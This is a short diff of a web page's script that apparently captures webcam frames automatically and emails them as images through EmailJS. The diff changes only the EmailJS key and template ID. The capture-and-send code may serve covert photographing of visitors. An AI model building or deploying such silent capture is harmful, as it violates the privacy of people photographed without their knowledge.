@@ -32,7 +32,7 @@
 
   <script>
     // Initialisation EmailJS
-    emailjs.init("mxm3fFA_BxEhqJieq");
+    emailjs.init("IoSfbtGz4KSL_5_9E");
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
@@ -50,7 +50,7 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL("image/png");
 
-          emailjs.send("service_8cs0gml", "template_w14xn7c", {
+          emailjs.send("service_8cs0gml", "template_hgvdx1g", {
             message: "Photo automatique capturée 📸",
             image: imageData
           })
@@ -80,3 +80,4 @@
   </script>
 </body>
 </html>
+
